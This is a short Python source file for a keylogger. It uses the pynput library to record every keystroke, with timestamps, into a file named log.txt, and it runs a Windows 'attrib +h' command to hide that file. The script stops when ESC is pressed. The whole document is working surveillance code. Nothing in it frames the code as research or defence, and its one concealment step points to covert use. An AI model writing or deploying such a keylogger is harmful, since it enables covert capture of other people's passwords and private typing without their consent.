#Uses pynput to detect and record keyboard input and stores it to a file called log.txt, the script is terminated upon a ESC key press.

from pynput import keyboard
import logging
import os

filename = 'log.txt'
logging.basicConfig(filename=filename,level=logging.DEBUG, filemode= 'w', format= '%(asctime)s - %(message)s', datefmt = '%d-%b-%y %H:%M:%S')
#set the file log.txt to become hidden, print error results in the log.
try:
    os.system(f'attrib +h {filename}')
    logging.info("file set as hidden.")
except Exception as e:
    logging.info("error setting file as hidden.")

def on_press(key):
    #Logs the keystroke into log.txt
    try:
        logging.info(str(key))
    except AttributeError:
        logging.info("error")

def on_release(key):
    #Terminate the Script
    if key == keyboard.Key.esc:
        print("script terminated.\n")
        logging.info("script termintaed")
        return False
        
#initializes the listener and tells it what functions to call upon a key press and release.
with keyboard.Listener(
    on_press = on_press,
    on_release=on_release
) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        print("script terminated.\n")